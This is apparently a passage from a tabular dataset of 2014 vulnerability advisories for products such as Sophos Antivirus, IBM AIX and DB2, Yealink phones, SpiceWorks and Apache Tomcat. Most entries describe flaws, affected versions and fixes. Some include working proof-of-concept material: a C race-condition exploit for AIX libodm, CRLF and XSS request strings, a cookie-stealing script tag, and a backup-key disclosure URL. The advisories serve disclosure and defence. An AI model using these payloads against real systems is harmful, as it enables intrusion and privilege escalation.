http://www.christian-schneider.net/advisories/CVE-2014-3149.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlOzCDAACgkQXYAsOfddvFNgVwCggTYy8+9mVPUlXYu4ugzMqsLI
z+gAn1RfHeDRt2OfaQuEendLdcvsumtF
=grTH
-----END PGP SIGNATURE-----"
6596,CVE-2014-2385 - Multiple Cross Site Scripting in Sophos Antivirus Configuration Console (Linux),,CVE-2014-2385,"Vulnerability title: Multiple Cross Site Scripting in Sophos Antivirus
Configuration Console (Linux)
CVE: CVE-2014-2385
Vendor: Sophos
Product: Antivirus
Affected version: 9.5.1
Fixed version: 9.6.1
Reported by: Pablo Catalina
Details:
The Configuration Console of Sophos Antivirus 9.5.1 (Linux) does not
sanitize several input parameters before sending them back to the
browser, so an attacker could inject code inside these parameters,
including JavaScript code. The following URLs and parameters are affected:
http://localhost:8081/exclusion/configure
newListList:ExcludeFileOnExpression
newListList:ExcludeFilesystems
newListList:ExcludeMountPaths
http://localhost:8081/notification/configure
text:EmailServer
newListList:Email
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2385/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6597,CVE-2014-3752 - Arbitrary Code Execution in G Data TotalProtection 2014,,CVE-2014-3752,"Vulnerability title: Arbitrary Code Execution in G Data TotalProtection 2014
CVE: CVE-2014-3752
Vendor: G Data
Product: TotalProtection 2014
Affected version: v24.0.2.1
Fixed version: N/A
Reported by: Kyriakos Economou
Details:
G Data TotalProtection 2014 v24.0.2.1 and possibly earlier versions are
vulnerable to arbitrary code execution.
A local attacker is able to execute code as SYSTEM by exploiting a bug
in the MiniIcpt.sys (v1.013046.218) device driver.
Other software from the same vendor using the affected driver may also
be vulnerable to the same attack.
This vulnerability doesnï¿½t currently allow elevation of privileges as
the attacker needs administrator rights to trigger the bug.
In particular, IOCTL 0ï¿½83170180 leads to:
OR ECX, -1
LOCK XADD DWORD PTR [EAX], ECX
These two instructions are used to decrement a value stored in a memory
location pointed by EAX, but in this case the value of EAX can be
controlled through the IOCTL input buffer from userland.
Any value in writeable memory can be decremented at will by triggering
the vulnerability multiple times.
The challenge in a scenario like this is to find a pointer that could
later be used to control the EIP.
For example, a pointer to another function of the same module could be
used through another IOCTL, if that pointer is stored to a known address
such as in the range of the driver module itself.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3752/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6634,[SECURITY] CVE-2013-2251: Apache Continuum affected by Remote Command Execution,,CVE-2013-2251,"CVE-2013-2251: Apache Continuum affected by Remote Command Execution
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Continuum 1.3.1 to Continuum 1.4.1
Description:
Apache Continuum is affected by a vulnerability in the version of the Struts library being used,
which allows a malicious user to run code on the server remotely. More details about the vulnerability
can be found at http://struts.apache.org/2.3.x/docs/s2-016.html.
Mitigation:
All users are recommended to upgrade to Continuum 1.4.2, which is not affected
by this issue.
References:
http://continuum.apache.org/security.html"
6643,CVE-2014-3427 CRLF Injection and CVE-2014-3428 XSS Injection in Yealink VoIP Phones,,CVE-2014-3427,"I. ADVISORY
CVE-2014-3427 CRLF Injection in Yealink VoIP Phones
CVE-2014-3428 XSS vulnerabilities in Yealink VoIP Phones
Date published: 06/12/2014
Vendor Contacted: 05/08/2014
II. BACKGROUND
Yealink is a manufacturer of VoIP and Video products. To
minimize noise read more at:
http://www.yealink.com/Companyprofile.aspx
III. DESCRIPTION
There are CRLF Injection and XSS vulnerabilities in Yealink
VoIP telephones. Validated on
Firmware Version 28.72.0.2
Hardware Version 28.2.0.128.0.0.0
CRLF Injection (Header Splitting) proof of concept:
Request
GET /servlet?linepage=1&model=%0d%0a%20 ANYTHING I WANT GOES HERE &p=dsskey&q=load HTTP/1.1
In the above request, attackers can shove in code, webpages,
etc. In my tests, I have used javascript, redirects, and even
an entire web page shoved into the CRLF vulnerable inputs.
-----
The XSS vulnerability
GET /servlet?jumpto=dsskey&model=%22%20onmouseover%3dprompt%28 1337 %29%20badpuppy%3d%22&p=login&q=loginForm HTTP/1.1
Typical Cross Site Scripting.
IV. SOLUTION
Minimize accessibility to the phone's interface.
V. VENDOR CONTACT AND RESPONSE
05/08/2014 E-mailed security yealink com (bounced)
05/08/2014 Created an account on Yealink's forum and
sent message (no response for weeks)
05/26/2014 Response via e-mail from Yealink
05/26/2014 Replied to vendor I would disclose in June
06/01/2014 Reached back out to vendor for update
06/08/2014 Reached back out to vendor for update
06/11/2014 Rouched out one last time... Crickets
06/12/2014 Advisory
VI. TOOLS USED
Burpsuite, WVS, Firefox
--
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
J. Oquendo
SGFA, SGFE, C|EH, CNDA, CHFI, OSCP, CPT, RWSP, GREM
""Where ignorance is our master, there is no possibility of
real peace"" - Dalai Lama
42B0 5A53 6505 6638 44BB 3943 2BF7 D83F 210A 95AF
http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x2BF7D83F210A95AF"
6650,CVE-2014-3977 - Privilege Escalation in IBM AIX,,CVE-2014-3977,"Vulnerability title: Privilege Escalation in IBM AIX
CVE: CVE-2014-3977
Vendor: IBM
Product: AIX
Affected version: 6.1.8 and later
Fixed version: N/A
Reported by: Tim Brown
Details:
It has been identified that libodm allows privilege escalation via
arbitrary file writes with elevated privileges (utilising SetGID and
SetUID programs). The following will cause a new file /etc/pwned to be
created with permissions of rw-rw-rw:
#include <stdlib.h> #include <unistd.h> #include <stdio.h> int
pwnedflag; int main(int argc, char **argv) { pwnedflag = 0; umask(0); if
(fork()) { setenv(""ODMERR"", ""1"", 1); while (!pwnedflag) { if
(!access(""/etc/pwned"", F_OK)) { pwnedflag = 1; printf(""Race
won... ""); unsetenv(""ODMERR""); exit(EXIT_SUCCESS); }
system(""/usr/bin/at""); } } else { while (!pwnedflag) {
symlink(""/etc/pwned"", ""ODMTRACE0""); if (!access(""/etc/pwned"", F_OK)) {
pwnedflag = 1; printf(""Race won... ""); exit(EXIT_SUCCESS); }
unlink(""ODMTRACE0""); } } }
It is believed this is a side affect of CVE-2012-2179 being incorrectly
resolved. As understood, prior to CVE-2012-2179 being fixed, libodm
would simply open ODMTRACE0 and write to it assuming ODMERR=1. It is
believed that the fix that was applied was to check for the presence of
ODMTRACE0 and increment until no file was found. It is necessary to win
a time of check, time of use race condition by creating a symlink from
the ODMTRACE0 in the current working directory to the target file under
hoping that the link will be added after the check has been made that
ODMTRACE0 does not exist.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3977/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6682,CVE-2014-3740 - SpiceWorks Cross-site scripting,,CVE-2014-3740,"Exploit Title: Multiple Stored XSS vulnerabilities in SpiceWorks Ticketing system
CVE: CVE-2014-3740
Vendor: SpiceWorks
Product: SpiceWorks IT ticketing system
Affected versions: any version below 7.2.00195
Fixed version: 7.2.00195
1. About the application:
=======================
SpiceWorks is an IT ticketing system deployed in many companies around the world
2. Details
===========
Multiple stored XSS were found in SpiceWorks system, allowing an attacker to create a SpiceWorks IT ticket with malicious code.
once an admin attemps to login to the system dashboard to view open tickets, the code executes and the attacker
could potentially steal the admin's cookies.
3. Timeline:
=============
12.5.2014 - Vulnerability discovered
12.5.2014 - Vendor notified
13.5.2014 - CVE Requested
15.5.2014 - CVE Assigned (CVE-2014-3740)
02.6.2014 - SpiceWorks fixed the problem in the latest version of 7.2 (7.2.00195)
07.6.2014 - Full disclosure released
4. Proof of concept:
===================
i. Create a ticket in user_portal with the title <script>alert(document.cookie);</script>
ii. submit.
iii. login as admin user and navigate to the open tickets, the XSS appears.
* A Proof of concept video can also be found here:
http://research.openflare.org/poc/OF-2014-07/spiceworks_crafted_ticket.mp4"
6696,Details for CVE-2014-0220,,CVE-2014-0220,"------------------------------------------------------------------------------------------
Technical Service Bulletin 2014-28 (TSB)
Title: Security Vulnerability: Sensitive Configuration Values Exposed in
Cloudera Manager
Certain configuration values that are stored in Cloudera Manager are
considered 'sensitive', such as database passwords. These configuration
values are expected to be inaccessible to non-admin users, and this is
enforced in the Cloudera Manager Admin Console. However, these
configuration values are not redacted when reading them through the API,
possibly making them accessible to users who should not have such access.
Products affected: Cloudera Manager
Releases affected: Cloudera Manager 4.8.2 and lower, Cloudera Manager 5.0.0
Users Affected: Cloudera Manager installations with non-admin users
Date/time of detection: May 7, 2014
Severity: High
Impact: Through the API only, non-admin users can access potentially
sensitive configuration information
CVE: CVE-2014-0220
Immediate action required:
See the following knowledge base article:
Security Vulnerability: Sensitive Configuration Values Exposed in Cloudera
Manager
ETA for resolution: May 13, 2014
Addressed in release/refresh/patch: Cloudera Manager 4.8.3 and 5.0.1
------------------------------------------------------------------------------------------"
6715,CVE-2014-0907 - SetUID/SetGID Programs Allow Privilege Escalation Via Insecure RPATH In IBM DB2,,CVE-2014-0907,"Vulnerability title: SetUID/SetGID Programs Allow Privilege Escalation
Via Insecure RPATH In IBM DB2
CVE: CVE-2014-0907
Vendor: IBM
Product: DB2
Affected version: V9.1, V9.5, V9.7, V10.1 and V10.5
Fixed version: V9.7 FP9a, V10.1 FP3a, V10.1 FP4 and V10.5 FP3a
Reported by: Tim Brown
Details:
It has been identified that binaries that are executed with elevated
privileges (SetGID and SetUID programs) in IBMï¿½s DB2 for AIX, Linux, HP
and Solaris have been compiled in manner that means they searched for
libraries in insecure locations.
SUIDFILE='/db2/db2gpe/sqllib/acs/acscim' SUIDFILELS='-rwsr-x--- 1 root
dbgpeadm 43848124 04 Oct 2012 /db2/db2gpe/sqllib/acs/acscim'
RPATH='../../common/unx/supincl/pegcim251/lib' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpe/sqllib/acs/acsnnas' SUIDFILELS='-rwsr-x--- 1 root
dbgpeadm 43399984 04 Oct 2012 /db2/db2gpe/sqllib/acs/acsnnas'
RPATH='../../common/unx/supincl/ontapsdk16/lib/aix' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpe/sqllib/acs/acsnsan' SUIDFILELS='-rwsr-x--- 1 root
dbgpeadm 46767866 04 Oct 2012 /db2/db2gpe/sqllib/acs/acsnsan'
RPATH='../../common/unx/supincl/ontapsdk16/lib/aix' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpe/sqllib/adm/db2iclean' SUIDFILELS='-r-sr-x--- 1
root dbgpeadm 23157 25 May 2013 /db2/db2gpe/sqllib/adm/db2iclean'
RPATH='.' RPATHRELATIVE=yes RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpp/sqllib/acs/acscim' SUIDFILELS='-rwsr-x--- 1 root
dbgppadm 43848124 04 Oct 2012 /db2/db2gpp/sqllib/acs/acscim'
RPATH='../../common/unx/supincl/pegcim251/lib' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpp/sqllib/acs/acsnnas' SUIDFILELS='-rwsr-x--- 1 root
dbgppadm 43399984 04 Oct 2012 /db2/db2gpp/sqllib/acs/acsnnas'
RPATH='../../common/unx/supincl/ontapsdk16/lib/aix' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpp/sqllib/acs/acsnsan' SUIDFILELS='-rwsr-x--- 1 root
dbgppadm 46767866 04 Oct 2012 /db2/db2gpp/sqllib/acs/acsnsan'
RPATH='../../common/unx/supincl/ontapsdk16/lib/aix' RPATHRELATIVE=yes
RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/db2/db2gpp/sqllib/adm/db2iclean' SUIDFILELS='-r-sr-x--- 1
root dbgppadm 23157 25 May 2013 /db2/db2gpp/sqllib/adm/db2iclean'
RPATH='.' RPATHRELATIVE=yes RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
SUIDFILE='/hpadmin/swrepo/sqllib/adm/db2iclean' SUIDFILELS='-r-sr-x--- 1
root 226 23157 06 May 2013 /hpadmin/swrepo/sqllib/adm/db2iclean'
RPATH='.' RPATHRELATIVE=yes RPATHLS=N/A RAPTHEXISTS=N/A ISBAD=yes
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-0907/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6717,CVE-2014-1226 s3dvt Root shell (still),,CVE-2014-1226,"CVE-2014-1226 s3dvt Root shell (still)
About s3dvt:
s3dvt is part of the 3d network display server which can be used as
3d desktop environment.
Vulnerability:
The s3dvt developers forgot to review all the code. There is still a
vulnerable function as in the previous CVE-2013-6825. At the date of
July 1, 2014 the last commit of the s3dvt is still vulnerable and
exploitable. Commit: 1e9c9c53fa192cbf4f79d724b5e6c76374516968
Details, patches, discussion and strategy to exploit at:
http://hmarco.org/bugs/CVE-2014-1226-s3dvt_0.2.2-root-shell.html
Because we found a bug in bash <= 4.3 this vulnerability can be
successfully exploited. Bash bug details at:
http://hmarco.org/bugs/bash_4.3-setuid-bug.html
Hector Marco
http://hmarco.org"
6718,CVE-2013-6825 DCMTK Root Privilege escalation,,CVE-2013-6825,"CVE-2013-6825 DCMTK Root Privilege escalation
About DCMTK:
DCMTK is a collection of libraries and applications implementing large parts
the DICOM standard. It includes software for examining, constructing and
converting DICOM image files, handling offline media, sending and receiving
images over a network connection, as well as demonstrative image storage and
worklist servers
Vulnerability:
A bug in DCMTK for versions prior to 3.6.1 allows to do a privilege escalation.
All DCMTK versions since 1993 to the current 3.6.1 (released February-2014) are
affected. The vulnerable packages are:
- dcmpsrcv
- dcmprscp
- movescu
- storescp
- dcmqrscp
- wlmscpfs
- dcmrecv
Details, patches, discussion and strategy to exploit at:
http://hmarco.org/bugs/dcmtk-3.6.1-privilege-escalation.html
Hector Marco
http://hmarco.org"
6719,CVE-2013-6876 s3dvt Root shell,,CVE-2013-6876,"CVE-2013-6876 s3dvt Root shell
About s3dvt:
s3dvt is part of the 3d network display server which can be used as
3d desktop environment.
Vulnerability:
A vulnerability in s3dvt for versions prior to 0.2.2 allows to obtain
a root shell.
Details, patches, discussion and strategy to exploit at:
http://hmarco.org/bugs/s3dvt_0.2.2-root-shell.html
Because we found a bug in bash <= 4.3 this vulnerability can be
successfully exploited. Bash bug details at:
http://hmarco.org/bugs/bash_4.3-setuid-bug.html
Hector Marco
http://hmarco.org"
6730,[FD] CVE-2013-6876 s3dvt Root shell,,CVE-2013-6876,"CVE-2013-6876 s3dvt Root shell
About s3dvt:
s3dvt is part of the 3d network display server which can be used as
3d desktop environment.
Vulnerability:
A vulnerability in s3dvt for versions prior to 0.2.2 allows to obtain
a root shell.
Details, patches, discussion and strategy to exploit at:
http://hmarco.org/bugs/s3dvt_0.2.2-root-shell.html
Because we found a bug in bash <= 4.3 this vulnerability can be
successfully exploited. Bash bug details at:
http://hmarco.org/bugs/bash_4.3-setuid-bug.html
Hector Marco
http://hmarco.org"
6733,"CVE-2014-2843 - ""Reflected Cross-Site Scripting (XSS)"" (CWE-79) vulnerability in ""infoware MapSuite""",CWE-79,CVE-2014-2843,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-2843
===================
""Reflected Cross-Site Scripting (XSS)"" (CWE-79) vulnerability in ""infoware MapSuite""
Vendor
===================
infoware GmbH
Product
===================
MapSuite
Affected versions
===================
This vulnerability affects versions of MapSuite MapAPI prior to 1.0.36 and 1.1.49
Fixed versions
===================
MapSuite MapAPI 1.0.36 and 1.1.49
Both patches are available since 2014-03-26.
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Medium
Exploitability
===================
No authentication required
Description
===================
Using a specially crafted URL to access the MapAPI it is possible to execute Reflected
Cross-Site Scripting (XSS) attacks. This enables attackers to impersonate victim users
(in context of the origin exposing the MapAPI) when logged-in victims are accessing
attacker supplied links.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
Migration
===================
MapSuite MapAPI 1.0.x users should upgrade to 1.0.36 or later as soon as possible.
MapSuite MapAPI 1.1.x users should upgrade to 1.1.49 or later as soon as possible.
See also
===================
n/a
Timeline
===================
2014-03-14 Vulnerability discovered
2014-03-14 Vulnerability responsibly reported to vendor
2014-03-21 Reply from vendor acknowledging report
2014-03-26 Reply from vendor with updated patch (version 1.0.36 and 1.1.49)
meanwhile Verification of the patch by reporting researcher + vendor informed customers
2014-06-01 Advisory published in coordination with vendor via BugTraq
References
===================
http://www.christian-schneider.net/advisories/CVE-2014-2843.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlOLhbUACgkQXYAsOfddvFMCUwCdHdnL8J+sizTRxY33OmdWfFlA
2OQAnRb79YiQ/SbwpdMt/Qg7/UCleMZ8
=vW4U
-----END PGP SIGNATURE-----"
6734,"CVE-2014-2233 - ""Server-Side Request Forgery"" (CWE-918) vulnerability in ""infoware MapSuite""",CWE-918,CVE-2014-2233,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-2233
===================
""Server-Side Request Forgery"" (CWE-918) vulnerability in ""infoware MapSuite""
Vendor
===================
infoware GmbH
Product
===================
MapSuite
Affected versions
===================
This vulnerability affects versions of MapSuite MapAPI prior to 1.0.36 and 1.1.49
Fixed versions
===================
MapSuite MapAPI 1.0.36 and 1.1.49
Both patches are available since 2014-03-26.
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Medium
Exploitability
===================
No authentication required
Description
===================
Using a specially crafted URL to access the MapAPI it is possible to issue
HTTP(S) GET requests originating from the attacked server (behind the firewall)
and to read the response. This enables attackers to access web servers that are not
exposed to be accessed from the internet and thus allows to pivot further into the
targeted network.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
Migration
===================
MapSuite MapAPI 1.0.x users should upgrade to 1.0.36 or later as soon as possible.
MapSuite MapAPI 1.1.x users should upgrade to 1.1.49 or later as soon as possible.
See also
===================
CVE-2014-2232 as another vulnerability in the same module, which can be exploited
as an Absolute Path Traversal via the same input parameter.
Timeline
===================
2014-02-20 Vulnerability discovered
2014-02-20 Vulnerability responsibly reported to vendor
2014-02-21 Reply from vendor acknowledging report
2014-02-26 Reply from vendor with first patch (version 1.0.34 and 1.1.47)
meanwhile Testing of the patch by the reporting researcher (Christian Schneider)
2014-03-20 Reported to vendor that first patch could by bypassed
meanwhile Conversation about fix strategies between vendor and reporting researcher
2014-03-26 Reply from vendor with updated patch (version 1.0.36 and 1.1.49)
meanwhile Verification of the patch by reporting researcher + vendor informed customers
2014-06-01 Advisory published in coordination with vendor via BugTraq
References
===================
http://www.christian-schneider.net/advisories/CVE-2014-2233.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlOLV74ACgkQXYAsOfddvFPrWgCgjqejfrV/Ro2b8aC4RQ+UHdGG
AoEAmgN82HZQgDspcd25PJxSBxXWalBw
=nu9C
-----END PGP SIGNATURE-----"
6735,"CVE-2014-2232 - ""Absolute Path Traversal"" (CWE-36) vulnerability in ""infoware MapSuite""",CWE-36,CVE-2014-2232,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-2232
===================
""Absolute Path Traversal"" (CWE-36) vulnerability in ""infoware MapSuite""
Vendor
===================
infoware GmbH
Product
===================
MapSuite
Affected versions
===================
This vulnerability affects versions of MapSuite MapAPI prior to 1.0.36 and 1.1.49
Fixed versions
===================
MapSuite MapAPI 1.0.36 and 1.1.49
Both patches are available since 2014-03-26.
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Critical
Exploitability
===================
No authentication required
Description
===================
It is possible to traverse the server's filesystem (including listing of directory
contents) and read files from the server's filesystem using a specially crafted URL
to access the MapAPI. This enables attackers to get hold of sensitive files from the
server containing passwords, configuration, source code, etc.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
Migration
===================
MapSuite MapAPI 1.0.x users should upgrade to 1.0.36 or later as soon as possible.
MapSuite MapAPI 1.1.x users should upgrade to 1.1.49 or later as soon as possible.
See also
===================
CVE-2014-2233 as another vulnerability in the same module, which can be exploited
as a Server-Side Request Forgery (SSRF) via the same input parameter.
Timeline
===================
2014-02-20 Vulnerability discovered
2014-02-20 Vulnerability responsibly reported to vendor
2014-02-21 Reply from vendor acknowledging report
2014-02-26 Reply from vendor with first patch (version 1.0.34 and 1.1.47)
meanwhile Testing of the patch by the reporting researcher (Christian Schneider)
2014-03-20 Reported to vendor that first patch could by bypassed
meanwhile Conversation about fix strategies between vendor and reporting researcher
2014-03-26 Reply from vendor with updated patch (version 1.0.36 and 1.1.49)
meanwhile Verification of the patch by reporting researcher + vendor informed customers
2014-06-01 Advisory published in coordination with vendor via BugTraq
References
===================
http://www.christian-schneider.net/advisories/CVE-2014-2232.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iEYEARECAAYFAlOLV7gACgkQXYAsOfddvFPjfQCgmcCuON9Ny7IbKQl4bmNFM5UP
4o4Anjrmi/9k+5W4tEyopZnRFqfqF2kX
=UDUk
-----END PGP SIGNATURE-----"
6753,Re: [SECURITY] CVE-2014-0099 Apache Tomcat information disclosure,,CVE-2014-0099,"CORRECTION: This is CVE-2014-0099 *NOT* -0097
Apologies for the typo
On 27/05/2014 13:46, Mark Thomas wrote:
> CVE-2014-0099 Information Disclosure
>
> Severity: Important
>
> Vendor: The Apache Software Foundation
>
> Versions Affected:
> - Apache Tomcat 8.0.0-RC1 to 8.0.3
> - Apache Tomcat 7.0.0 to 7.0.52
> - Apache Tomcat 6.0.0 to 6.0.39
>
> Description:
> The code used to parse the request content length header did not check
> for overflow in the result. This exposed a request smuggling
> vulnerability when Tomcat was located behind a reverse proxy that
> correctly processed the content length header.
>
> Mitigation:
> Users of affected versions should apply one of the following mitigations
> - Upgrade to Apache Tomcat 8.0.5 or later
> (8.0.4 contains the fix but was not released)
> - Upgrade to Apache Tomcat 7.0.53 or later
> - Upgrade to Apache Tomcat 6.0.41 or later
> (6.0.40 contains the fix but was not released)
>
> Credit:
> A test case that demonstrated the parsing bug was sent to the Tomcat
> security team but no context was provided. The security implications
> were identified by the Tomcat security team .
>
> References:
> [1] http://tomcat.apache.org/security-8.html
> [2] http://tomcat.apache.org/security-7.html
> [3] http://tomcat.apache.org/security-6.html
>
> ---------------------------------------------------------------------
> To unsubscribe, e-mail: security-unsubscribe tomcat apache org
> For additional commands, e-mail: security-help tomcat apache org
>"
6754,CVE-2014-3445 - Unauthenticated Backup and Password Disclosure in HandsomeWeb SOS Webpages,,CVE-2014-3445,"Vulnerability title: Unauthenticated Backup and Password Disclosure in
HandsomeWeb SOS Webpages
CVE: CVE-2014-3445
Vendor: HandsomeWeb
Product: SOS Webpages
Affected version: 1.1.11 and earlier
Fixed version: 1.1.12
Reported by: Freakyclown
Details:
The default setup allows an unauthenticated user to access
administrative functions such as backing up of key files within the CMS.
This is done by appending the following to a domain using the software
affected.
/backup.php?a=2&k=6f15afa1ac4edea0g145e884116334b7
Where ""a"" is the file number to back up and ""k"" is the MD5key used to
authenticate the administrator, however if ""k"" does not match the
correct key rather than disallowing the unauthenticated user to back up
the file the service will provide the user with the correct key. For
example:
Failure, wrong key. The right key is 5f17aca1ae2edea0f145e884116371a5
Using this new key in the url such as below:
/backup.php?a=2&k=5f17aca1ae2edea0f145e884116371a5
Will allow the user to perform the backup of files.
In addition to this the key is generated by the code:
$backupkey=MD5
Making it trivial to decrypt the key provided above to gain the
administrators password and gain further control over the site.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3445/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6755,[SECURITY] CVE-2014-0119 Apache Tomcat information disclosure,,CVE-2014-0119,"CVE-2014-0119 Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Tomcat 8.0.0-RC1 to 8.0.5
- Apache Tomcat 7.0.0 to 7.0.53
- Apache Tomcat 6.0.0 to 6.0.39
Description:
In limited circumstances it was possible for a malicious web application
to replace the XML parsers used by Tomcat to process XSLTs for the
default servlet, JSP documents, tag library descriptors (TLDs) and tag
plugin configuration files. The injected XMl parser(s) could then bypass
the limits imposed on XML external entities and/or have visibility of
the XML files processed for other web applications deployed on the same
Tomcat instance.
Mitigation:
Users of affected versions should apply one of the following mitigations
- Upgrade to Apache Tomcat 8.0.8 or later
(8.0.6 and 8.0.7 contain the fix but were not released)
- Upgrade to Apache Tomcat 7.0.54 or later
- Upgrade to Apache Tomcat 6.0.41 or later
(6.0.40 contains the fix but was not released)
Credit:
This issue was identified by the Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html"
6756,[SECURITY] CVE-2014-0097 Apache Tomcat information disclosure,,CVE-2014-0097,"CVE-2014-0097 Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Tomcat 8.0.0-RC1 to 8.0.3
- Apache Tomcat 7.0.0 to 7.0.52
- Apache Tomcat 6.0.0 to 6.0.39
Description:
The code used to parse the request content length header did not check
for overflow in the result. This exposed a request smuggling
vulnerability when Tomcat was located behind a reverse proxy that
correctly processed the content length header.
Mitigation:
Users of affected versions should apply one of the following mitigations
- Upgrade to Apache Tomcat 8.0.5 or later
(8.0.4 contains the fix but was not released)
- Upgrade to Apache Tomcat 7.0.53 or later
- Upgrade to Apache Tomcat 6.0.41 or later
(6.0.40 contains the fix but was not released)
Credit:
A test case that demonstrated the parsing bug was sent to the Tomcat
security team but no context was provided. The security implications
were identified by the Tomcat security team .
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html"
6757,[SECURITY] CVE-2014-0096 Apache Tomcat information disclosure,,CVE-2014-0096,"CVE-2014-0096 Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Tomcat 8.0.0-RC1 to 8.0.3
- Apache Tomcat 7.0.0 to 7.0.52
- Apache Tomcat 6.0.0 to 6.0.39
Description:
The default servlet allows web applications to define (at multiple
levels) an XSLT to be used to format a directory listing. When running
under a security manager, the processing of these was not subject to the
same constraints as the web application. This enabled a malicious web
application to bypass the file access constraints imposed by the
security manager via the use of external XML entities.
Mitigation:
Users of affected versions should apply one of the following mitigations
- Upgrade to Apache Tomcat 8.0.5 or later
(8.0.4 contains the fix but was not released)
- Upgrade to Apache Tomcat 7.0.53 or later
- Upgrade to Apache Tomcat 6.0.41 or later
(6.0.40 contains the fix but was not released)
Credit:
This issue was identified by the Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html"
